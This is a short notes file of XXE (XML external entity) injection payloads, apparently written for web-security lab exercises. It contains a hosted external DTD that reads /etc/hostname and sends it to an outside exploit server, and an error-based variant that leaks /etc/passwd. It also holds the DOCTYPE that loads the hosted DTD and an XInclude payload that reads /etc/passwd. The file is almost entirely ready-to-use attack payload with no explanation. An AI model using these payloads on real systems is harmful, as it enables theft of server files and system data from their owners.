//hosted payload for single line file

<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % stack "<!ENTITY &#x25; exfile SYSTEM 'https://exploit-0ae1006404b4b263c00cb47f01ae0023.exploit-server.net/?hostname=%file;'>">



//hosted payload for multi line file 

<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % stack "<!ENTITY &#x25; exfile SYSTEM 'file:///error/%file;'>">



//xxe payload

<!DOCTYPE test [<!ENTITY % xxe SYSTEM "https://exploit-0ae1006404b4b263c00cb47f01ae0023.exploit-server.net/exploit">
%xxe; 
%stack; 
%exfile;]>



// simple xxe injection payload for url query /?=
first check the parameter with this !ENTITY %26hack;
<hack xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></hack>